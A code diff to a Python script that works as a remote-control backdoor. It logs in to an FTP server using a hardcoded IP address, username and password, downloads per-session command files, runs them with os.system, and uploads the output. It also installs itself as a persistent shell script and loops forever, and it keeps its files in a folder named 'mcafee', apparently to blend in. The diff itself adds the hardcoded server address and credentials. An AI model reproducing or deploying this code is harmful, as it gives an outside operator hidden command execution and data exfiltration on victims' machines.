@@ -10,10 +10,11 @@ parent_dir = "mcafee"
 
 class cmdFile:
     def __init__(self, session):
-        self.proxy_ip = sys.stdin.readline().replace("\n", "")
-        self.proxy_port = int(sys.stdin.readline().replace("\n", "") or "21")#input("\nEnter Port: ") or "21")
-        self.proxy_user = sys.stdin.readline().replace("\n", "")#input("\nEnter User: ") or "anonymous"
-        self.proxy_pass = sys.stdin.readline().replace("\n", "")#input("\nEnter Pass: ") or "anonymous"
+        self.proxy_ip = input("\nEnter IP: ") or "136.233.9.51"#sys.stdin.readline().replace("\n", "")
+        self.proxy_port = int(input("\nEnter Port: ") or "21")#int(sys.stdin.readline().replace("\n", "") or "21")#input("\nEnter Port: ") or "21")
+        self.proxy_user = input("\nEnter User: ") or "16BCE0707"#sys.stdin.readline().replace("\n", "")#input("\nEnter User: ") or "anonymous"
+        self.proxy_pass = input("\nEnter Pass: ") or "84717769"#sys.stdin.readline().replace("\n", "")#input("\nEnter Pass: ") or "anonymous"
+        self.proxy_user = "16BCE0707"
     #sys.stdin.
         #for line in sys.stdin:
         #    print(line)
@@ -25,7 +26,7 @@ class cmdFile:
         print(self.proxy_pass)
         #raise Exception("Help")
         self.session = session
-        self.pwd = "/home/matlab"
+        self.pwd = "/tmp"
         self.oo = b''
         self.ss = ''
         self.connectFtp()
@@ -33,12 +34,14 @@ class cmdFile:
         self.session_file.close()
         try:
             self.ftp.mkd(parent_dir)
-        except:
-            print("some error 0x1")
+        except Exception as e:
+            print("some error 0x1 ")
+            print(e)
         try:
             self.ftp.cwd(parent_dir)
-        except:
-            print("Some error 0x3")
+        except Exception as e:
+            print("some error 0x3 ")
+            print(e)
         return 
     def connectFtp(self):
         try:
@@ -95,8 +98,9 @@ class cmdFile:
             self.ftp.storbinary('STOR ' + self.session + '.op', bio)
             bio = io.BytesIO(bytes(oop, 'ascii'))   # Save this output into a file
             self.ftp.storbinary('STOR ' + self.session + '.oo', bio)
-        except:
+        except Exception as e:
             print("some error 0x5")
+            print(e)
         return 
     def getCommandFile(self):
         self.ss = ''
@@ -104,11 +108,17 @@ class cmdFile:
             self.tmpfile = open('tmp'+self.session+'.cm', 'wb')
             self.ftp.retrbinary("RETR " + self.session + '.cm', self.tmpfile.write)
             self.tmpfile.close()
+        except Exception as e:
+            pass
+            #print("Error 0x41")
+            # Create a blank file
+            #print(e)
+        try:
             self.tmpfile = open('tmp'+self.session+'.cm', 'rb')
             self.ss = self.tmpfile.read()
             self.tmpfile.close()
         except Exception as e:
-            print("Error 0x4")
+            print("Error 0x42")
             print(e)
             #bio = io.BytesIO(b'uname -a')
             #self.ftp.storbinary('STOR ' + self.session + '.cm', bio)
@@ -164,7 +174,7 @@ class cmdFile:
         f.close()
         os.system("chmod +x "+self.pwd+"/"+scriptname+".sh\nsh "+self.pwd+"/"+scriptname+".sh")
 
-c = cmdFile('tt')
+c = cmdFile('demo3')
 try:
     c.linux_python_ScriptCreate(open('./client.py', 'rb').read(),'ss1')
     c.setPersistance("ss1")
@@ -175,6 +185,6 @@ while True:
     try:
         c.executeCommand()
     except Exception as e:
-        print("\nError2")
+        #print("\nError2")
         print(e)
         time.sleep(1)
